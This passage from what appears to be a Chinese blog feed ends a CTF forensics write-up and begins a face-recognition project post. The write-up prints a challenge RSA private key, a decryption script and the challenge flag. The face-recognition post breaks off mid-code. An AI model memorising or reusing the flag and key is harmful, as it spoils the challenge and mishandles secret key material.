class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXgIBAAKBgQD0UN0A+70iM0VCJ1ni0n/U1BRj0u8yMWH4Qi+xTbjHgbE7wOuk</span><br><span class="line">OaO+2PyQXiqIzZnf5jCkJuVDYjALGcKrZM4OCQBBd85B/LTc36XZ7JVfX5kGy5tI</span><br><span class="line">R3tquuPIVKNdAsHlSqh9S7YSS39RdnSa5rOUyGhrLzxwzzM9IO4e+QQ+CQIDAQAB</span><br><span class="line">AoGADiaw5mGubtCxbkeBOVYf+V/fXnjVSf76QbrzsD1kOooUjfV6sKR2C5Pd7S7H</span><br><span class="line">H+1owENBBgEKvoBtb/cqA2tvU9vQ4l5TMBJcHv6LEcb9WPpnMxPV2GNjO+DTPGPy</span><br><span class="line">Xnu1UZlZjwx+NaF5rESoSSVS2ZaaIixBs4RWRXk+lHEbTFECQQD6Rp6jMweRgPHO</span><br><span class="line">pR3mgIK83zL+kzqYM5isIPv3DIC5JQN2kXqK73IDQCFVlfXnr9lAAVRzLDsAXLqv</span><br><span class="line">le/o6yQLAkEA+edY+GERlLuD1t2k9Js0Dc7EwnLcxoFUE60ivj8Gf9jzLskGHxsv</span><br><span class="line">0IV6J5OHwPh54kAxAnqCjSqNRAWGNzr+uwJBALYEjDUm1LdGrxXZ0jAkgHC6Z0zs</span><br><span class="line">aK3uwHdXGcinqCp+t9EQpq3KzQF+L4AeKxRQONEq5m9I2LQ/vGocwrmD4dcCQQDb</span><br><span class="line">rTyOinWz8upAFPKOe2hUwvA/pkzgyosoCMhDyI9kD0gmVlvlODbd7Jem9o8dWM97</span><br><span class="line">zcXHUf41LbSkmN6U6m1FAkEAqmZbr35bPfkeoiikwNl6OVQytg12TZjw2vIbvfub</span><br><span class="line">f9Rvti8Lh/tbrmhZroiz8/l3aAZmugI1NBcbeZR0gz8ggg==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.ssleye.com/ssltool/priv_get.html">在线工具</a>解析</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/7.png" alt="image-20241222124043866"></p><p>尝试以key.txt的16进制为密文进行解密</p><p>使用010editor打开key.txt，获取十六进制数据</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/8.png" alt="image-20241222124408568"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">12 05 C9 B3 B4 0C 16 EE 4F 66 91 AD 71 F6 80 CD</span><br><span class="line">3F 3A 5C 98 F1 0E 33 38 FE B4 93 7A 96 4C A1 0D</span><br><span class="line">D4 C2 BA 97 E2 4A E1 D9 E2 1F E9 F5 D3 54 03 20</span><br><span class="line">F1 47 68 7E 4D 1C A0 97 64 D6 7D 0F EA 56 16 55</span><br><span class="line">80 53 AD AE C6 80 C1 D4 12 0F A0 50 E1 68 2D 05</span><br><span class="line">AA 44 8F E5 D8 0C CA E5 84 7E DA 66 43 AE 1F DE</span><br><span class="line">09 B3 A1 33 9A 3A 9D 55 CC 93 6D A2 76 01 34 26</span><br><span class="line">99 37 CD 7B 72 4B 70 56 72 51 6C D7 FE C4 EA 13</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RSA参数</span></span><br><span class="line">n = <span class="number">171564439954497216675768413953835569169744870521923941237304224433236499730629920633302799836863759824245577710773498119568181026335038584320641144215097129520996051634323993425856922224234683255676795474474502157940113864934282828740227389849908591389963794217637935199351304931352200910561925740911401385481</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">9937266186539991676476141711838500702936532470226334451329887482621507743373532183713283003200250733064318064453609394111430416039303087814229424347170432034113193190833030069901831137256791793745782217103476219351831386347398299123883138090715324312420650276465474501757462292263213648181367569336785128529</span></span><br><span class="line">p = <span class="number">13108010293446761340196632179613357635987885161740190449406207540374275902270524889036958918167981833207018535542419157628046922388279842487382660916913163</span></span><br><span class="line">q = <span class="number">13088518860888399246566644050502763674299741757769502566717048439252763374675791226334700471400894138975721568725124324655217397612193189858170783443648187</span></span><br><span class="line">dP = <span class="number">9533043847239772735367686643833429436869105550513796746723958527196226747179761474986169231375261579201765788173983006698896813430468012458246788337623511</span></span><br><span class="line">dQ = <span class="number">11505402621050409396138126001334577647380992762334269845561578353988612509194383822102661003057898764764809490429137927329402845361222663041170923816906053</span></span><br><span class="line">qInv = <span class="number">8924563590703900106842685814387665916541700812430476060674809923936560651318359405279262418182232089852584767661307777487338282244935435432054792625528962</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_ciphertext = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">12 05 C9 B3 B4 0C 16 EE 4F 66 91 AD 71 F6 80 CD</span></span><br><span class="line"><span class="string">3F 3A 5C 98 F1 0E 33 38 FE B4 93 7A 96 4C A1 0D</span></span><br><span class="line"><span class="string">D4 C2 BA 97 E2 4A E1 D9 E2 1F E9 F5 D3 54 03 20</span></span><br><span class="line"><span class="string">F1 47 68 7E 4D 1C A0 97 64 D6 7D 0F EA 56 16 55</span></span><br><span class="line"><span class="string">80 53 AD AE C6 80 C1 D4 12 0F A0 50 E1 68 2D 05</span></span><br><span class="line"><span class="string">AA 44 8F E5 D8 0C CA E5 84 7E DA 66 43 AE 1F DE</span></span><br><span class="line"><span class="string">09 B3 A1 33 9A 3A 9D 55 CC 93 6D A2 76 01 34 26</span></span><br><span class="line"><span class="string">99 37 CD 7B 72 4B 70 56 72 51 6C D7 FE C4 EA 13</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除空格和换行符</span></span><br><span class="line">hex_ciphertext = hex_ciphertext.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将十六进制密文转换为整数</span></span><br><span class="line">c = <span class="built_in">int</span>(hex_ciphertext, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用RSA私钥解密</span></span><br><span class="line">m1 = <span class="built_in">pow</span>(c, dP, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c, dQ, q)</span><br><span class="line">h = (qInv * (m1 - m2)) % p</span><br><span class="line">m = m2 + h * q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将明文转换为字节并打印</span></span><br><span class="line">plaintext_bytes = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;明文: <span class="subst">&#123;plaintext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>明文: R0Vׁv/{Is}wn}pKAJ9YTJ]|誴J_У?tդAQ+J6~n hi, boys and girls! flag is {haPPy_Use_0penSsI}</p></blockquote><h2 id="补充-提取pdf">(补充)提取pdf</h2><p>pdf文件有多条流量数据，对任意pdf流量追踪TCP流可以看到完整pdf信息。显示为原始数据并导出</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/9.png" alt="image-20241222125346387"></p><p>导出文件正常</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/10.png" alt="image-20241222125451891"></p><h2 id="tips">tips</h2><p>流程大体为：</p><ol><li class="lvl-3"><p>过滤 <code>ftp-data</code></p></li><li class="lvl-3"><p>追踪 TCP 流</p></li><li class="lvl-3"><p>显示为原始数据</p></li><li class="lvl-3"><p>另存为对应后缀的文件</p></li></ol><p><strong>不要将非原始数据的信息直接复制到任意新建文件中再改后缀</strong></p><p>比如在 wireshark 中将 pdf 的 utf-8 信息导出</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/11.png" alt="image-20241222125959436"></p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/12.png" alt="image-20241222130036367"></p><p>放到010中对比看一下</p><p><img src="/assets/post_img/ctf/%E5%88%A9%E7%94%A8wireshark%E4%BB%8EFTP%E6%B5%81%E9%87%8F%E4%B8%AD%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6/13.png" alt="image-20241222130438957"></p><p>导出 原始数据(raw) 会保留数据的原始二进制形式，不会进行任何转换或编码；utf-8 是文本编码格式，适用于纯文本数据。如果数据包含非文本内容（如二进制数据、加密数据等），使用这些编码格式可能会导致数据解释错误或丢失信息</p>]]></content>
      
      
      <categories>
          
          <category> CTF系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于OpenCV &amp; face-recognition 的实时人脸识别与身份验证</title>
      <link href="/posts/236b7493.html"/>
      <url>/posts/236b7493.html</url>
      
        <content type="html"><![CDATA[<h1>基于 OpenCV &amp; face-recognition 的实时人脸识别与身份验证</h1><p><strong>项目地址：<a href="https://github.com/gubaiovo/face-recognition-with-opencv">github</a></strong></p><h3 id="一、系统需求设计">一、系统需求设计</h3><h4 id="1-系统概述">1. 系统概述</h4><p>本人工智能人脸识别系统旨在实现对人脸图像或视频流中的人脸进行精准识别、验证与分析，可以应用于安防监控、门禁系统、人员考勤、身份认证等多个领域，以提高安全性与管理效率。</p><h4 id="2-功能概述">2. 功能概述</h4><p>1). 人脸录入与图像编码</p><p>2). 人脸识别与身份验证</p><p>3). web端实现上述功能</p><h3 id="二、系统功能模块介绍">二、系统功能模块介绍</h3><p>核心环境配置：</p><table><thead><tr><th>模块</th><th>版本</th></tr></thead><tbody><tr><td>python</td><td>3.12.4</td></tr><tr><td>opencv-python</td><td>4.10.0.84</td></tr><tr><td>face-recognition</td><td>1.3.0</td></tr><tr><td>Pillow</td><td>10.0.0</td></tr><tr><td>numpy</td><td>2.1.2</td></tr><tr><td>Flask (web需要)</td><td>3.1.0</td></tr></tbody></table><p>项目架构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Face_recognition_local</span><br><span class="line">├─ camera.py</span><br><span class="line">├─ fps.py</span><br><span class="line">├─ haarcascade_frontalface_default.xml</span><br><span class="line">├─ trained_model.pkl</span><br><span class="line">├─ training.py</span><br><span class="line">├─ main.py</span><br><span class="line">└─ person</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Face_recognition_web</span><br><span class="line">├─ camera.py</span><br><span class="line">├─ fps.py</span><br><span class="line">├─ haarcascade_frontalface_default.xml</span><br><span class="line">├─ trained_model.pkl</span><br><span class="line">├─ training.py</span><br><span class="line">├─ person</span><br><span class="line">├─ app.py</span><br><span class="line">└─ templates</span><br><span class="line">   └─ index.html</span><br></pre></td></tr></table></figure><p><strong><a href="http://camera.py">camera.py</a></strong>：优化后的opencv视频捕获</p><p><strong><a href="http://fps.py">fps.py</a></strong>：用于展示当前视频画面fps</p><p><strong>haarcascade_frontalface_default.xml</strong>：opencv提供的预训练集，用于捕获人脸</p><p><strong>trained_model.pkl</strong>：录入的人脸图片编码后的文件</p><p><strong><a href="http://training.py">training.py</a></strong>：用于将jpg图片编码为.pkl</p><p><strong>person</strong>：存放人脸图片</p><p><strong><a href="http://main.py">main.py</a></strong>：主程序</p><p><strong><a href="http://app.py">app.py</a></strong>：web后端</p><p><strong>templates</strong>：web前端文件夹</p><p><strong>index.html</strong>：web前端</p><h3 id="三、系统实现">三、系统实现</h3><h4 id="系统核心流程图">系统核心流程图</h4><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/workline.png" alt="workline"></p><h4 id="训练模型——training-py">训练模型——<a href="http://training.py">training.py</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">person_encodings = []</span><br><span class="line">person_names = []</span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">&#x27;person&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.jpg&#x27;</span>):</span><br><span class="line">        <span class="comment"># 编码图像</span></span><br><span class="line">        image = face_recognition.load_image_file(os.path.join(<span class="string">&#x27;person&#x27;</span>, filename))</span><br><span class="line">        encodings = face_recognition.face_encodings(image)</span><br><span class="line">        <span class="keyword">if</span> encodings:</span><br><span class="line">            encoding = encodings[<span class="number">0</span>]</span><br><span class="line">            person_encodings.append(encoding)</span><br><span class="line">            <span class="comment"># 文件名处理</span></span><br><span class="line">            person_name = <span class="string">&#x27;&#x27;</span>.join([i <span class="keyword">for</span> i <span class="keyword">in</span> os.path.splitext(filename)[<span class="number">0</span>] <span class="keyword">if</span> <span class="keyword">not</span> i.isdigit()])</span><br><span class="line">            person_names.append(person_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;trained_model.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump((person_encodings, person_names), f)</span><br></pre></td></tr></table></figure><p>分段解析：</p><ol><li class="lvl-3"><p>读取person文件夹中.jpg文件，其中文件名格式为 <code>姓名+编号.jpg</code> ，如 <code>张三1.jpg</code></p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取person文件夹中的图像和姓名</span></span><br><span class="line">person_encodings = []</span><br><span class="line">person_names = []</span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">&#x27;person&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.jpg&#x27;</span>):</span><br></pre></td></tr></table></figure><ol start="2"><li class="lvl-3"><p>使用face-recognition编码图片</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用face-recognition加载图像并进行编码，并处理文件名中的编号</span></span><br><span class="line">        image = face_recognition.load_image_file(os.path.join(<span class="string">&#x27;person&#x27;</span>, filename))</span><br><span class="line">        encodings = face_recognition.face_encodings(image)</span><br><span class="line">        <span class="keyword">if</span> encodings:</span><br><span class="line">            encoding = encodings[<span class="number">0</span>]</span><br><span class="line">            person_encodings.append(encoding)</span><br><span class="line">            <span class="comment"># 去掉文件名中的编号，只保留姓名部分</span></span><br><span class="line">            person_name = <span class="string">&#x27;&#x27;</span>.join([i <span class="keyword">for</span> i <span class="keyword">in</span> os.path.splitext(filename)[<span class="number">0</span>] <span class="keyword">if</span> <span class="keyword">not</span> i.isdigit()])</span><br><span class="line">            person_names.append(person_name)</span><br></pre></td></tr></table></figure><p>在person文件夹中放入目标人脸的jpg图片后运行脚本，得到模型trained_model.pkl</p><p>经测试，每人9个图片识别准确率为 65％-90％</p><h4 id="主流程">主流程</h4><h5 id="启动摄像头——camera-py">启动摄像头——<a href="http://camera.py">camera.py</a></h5><p>来源：<a href="https://blog.csdn.net/weixin_43229348/article/details/122688684">基于cv2.VideoCapture 和 OpenCV 得到更快的 FPS之文件篇</a></p><p>主要优化函数：cv2.VideoCapture</p><blockquote><p><code>.read</code> 方法是一个阻塞操作，通过将这些阻塞 I/O 操作移至单独的线程并维护解码帧队列，我们实际上可以将 FPS 处理速率提高 52% 以上</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread, Lock</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">time_cycle = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CameraThread</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, kill_event, src = <span class="number">0</span>, width = <span class="number">320</span>, height = <span class="number">240</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.kill_event = kill_event</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.stream = cv2.VideoCapture(src)</span><br><span class="line">        <span class="variable language_">self</span>.stream.<span class="built_in">set</span>(cv2.CAP_PROP_FRAME_WIDTH, width)</span><br><span class="line">        <span class="variable language_">self</span>.stream.<span class="built_in">set</span>(cv2.CAP_PROP_FRAME_HEIGHT, height)</span><br><span class="line"></span><br><span class="line">        (<span class="variable language_">self</span>.grabbed, <span class="variable language_">self</span>.frame) = <span class="variable language_">self</span>.stream.read()</span><br><span class="line">        <span class="variable language_">self</span>.read_lock = Lock()</span><br><span class="line"></span><br><span class="line">        Thread.__init__(<span class="variable language_">self</span>, args = kill_event)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        (grabbed, frame) = <span class="variable language_">self</span>.stream.read()</span><br><span class="line">        <span class="variable language_">self</span>.read_lock.acquire()</span><br><span class="line">        <span class="variable language_">self</span>.grabbed, <span class="variable language_">self</span>.frame = grabbed, frame</span><br><span class="line">        <span class="variable language_">self</span>.read_lock.release()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.read_lock.acquire()</span><br><span class="line">        frame = <span class="variable language_">self</span>.frame.copy()</span><br><span class="line">        <span class="variable language_">self</span>.read_lock.release()</span><br><span class="line">        <span class="keyword">return</span> frame</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.kill_event.is_set():</span><br><span class="line">            start_time = datetime.now()</span><br><span class="line">            <span class="variable language_">self</span>.update()</span><br><span class="line"></span><br><span class="line">            finish_time = datetime.now()</span><br><span class="line">            dt = finish_time - start_time</span><br><span class="line">            ms = (dt.days * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> + dt.seconds) * <span class="number">1000</span> + dt.microseconds / <span class="number">1000.0</span></span><br><span class="line">            <span class="keyword">if</span> ms &lt; time_cycle:</span><br><span class="line">                time.sleep((time_cycle - ms) / <span class="number">1000.0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>CameraThread</code> 类继承自 <code>Thread</code> 类，可以在<strong>单独的线程</strong>中捕获摄像头图像</p><ol><li class="lvl-3"><p>初始化方法 <code>__init__</code>：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, kill_event, src=<span class="number">0</span>, width=<span class="number">320</span>, height=<span class="number">240</span></span>):</span><br><span class="line">    <span class="variable language_">self</span>.kill_event = kill_event</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">self</span>.stream = cv2.VideoCapture(src)</span><br><span class="line">    <span class="variable language_">self</span>.stream.<span class="built_in">set</span>(cv2.CAP_PROP_FRAME_WIDTH, width)</span><br><span class="line">    <span class="variable language_">self</span>.stream.<span class="built_in">set</span>(cv2.CAP_PROP_FRAME_HEIGHT, height)</span><br><span class="line"></span><br><span class="line">    (<span class="variable language_">self</span>.grabbed, <span class="variable language_">self</span>.frame) = <span class="variable language_">self</span>.stream.read()</span><br><span class="line">    <span class="variable language_">self</span>.read_lock = Lock()</span><br><span class="line"></span><br><span class="line">    Thread.__init__(<span class="variable language_">self</span>, args=(kill_event,))</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p><code>kill_event</code>：用于停止线程的事件对象。</p></li><li class="lvl-2"><p><code>src</code>：摄像头索引，默认值为 0。</p></li><li class="lvl-2"><p><code>width</code> 和 <code>height</code>：视频帧的宽度和高度。</p></li><li class="lvl-2"><p><code>self.stream</code>：创建一个视频捕获对象。</p></li><li class="lvl-2"><p><code>self.stream.set</code>：设置视频帧的宽度和高度。</p></li><li class="lvl-2"><p><code>self.grabbed</code> 和 <code>self.frame</code>：读取第一帧图像。</p></li><li class="lvl-2"><p><code>self.read_lock</code>：创建一个锁对象，用于线程同步。</p></li></ul><ol start="2"><li class="lvl-3"><p>更新方法 <code>update</code>：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">    (grabbed, frame) = <span class="variable language_">self</span>.stream.read()</span><br><span class="line">    <span class="variable language_">self</span>.read_lock.acquire()</span><br><span class="line">    <span class="variable language_">self</span>.grabbed, <span class="variable language_">self</span>.frame = grabbed, frame</span><br><span class="line">    <span class="variable language_">self</span>.read_lock.release()</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p><code>self.stream.read()</code>：读取一帧图像。</p></li><li class="lvl-2"><p><code>self.read_lock.acquire()</code> 和 <code>self.read_lock.release()</code>：在更新 <code>self.grabbed</code>和 <code>self.frame</code> 时加锁和解锁，以确保线程安全。</p></li></ul><ol start="3"><li class="lvl-3"><p>读取方法 <code>read</code> ：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="variable language_">self</span>.read_lock.acquire()</span><br><span class="line">    frame = <span class="variable language_">self</span>.frame.copy()</span><br><span class="line">    <span class="variable language_">self</span>.read_lock.release()</span><br><span class="line">    <span class="keyword">return</span> frame</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p><code>self.read_lock.acquire()</code>和 <code>self.read_lock.release()</code>：在读取 <code>self.frame</code> 时加锁和解锁，以确保线程安全。</p></li><li class="lvl-2"><p><code>self.frame.copy()</code>：返回当前帧的副本。</p></li></ul><ol start="4"><li class="lvl-3"><p>运行方法 <code>run</code> ：</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.kill_event.is_set():</span><br><span class="line">        start_time = datetime.now()</span><br><span class="line">        <span class="variable language_">self</span>.update()</span><br><span class="line"></span><br><span class="line">        finish_time = datetime.now()</span><br><span class="line">        dt = finish_time - start_time</span><br><span class="line">        ms = (dt.days * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> + dt.seconds) * <span class="number">1000</span> + dt.microseconds / <span class="number">1000.0</span></span><br><span class="line">        <span class="keyword">if</span> ms &lt; time_cycle:</span><br><span class="line">            time.sleep((time_cycle - ms) / <span class="number">1000.0</span>)</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p><code>while not self.kill_event.is_set()</code>：循环运行，直到 <code>kill_event</code>被设置。</p></li><li class="lvl-2"><p><code>start_time</code> 和 <code>finish_time</code>：记录每次循环的开始和结束时间。</p></li><li class="lvl-2"><p><code>dt</code>：计算每次循环的时间差。</p></li><li class="lvl-2"><p><code>ms</code>：将时间差转换为毫秒。</p></li><li class="lvl-2"><p><code>time.sleep((time_cycle - ms) / 1000.0)</code>：如果循环时间小于 <code>time_cycle</code>，则延时以控制帧率。</p></li></ul><h5 id="fps计算——fps-py">fps计算——<a href="http://fps.py">fps.py</a></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FPS</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.prev_time 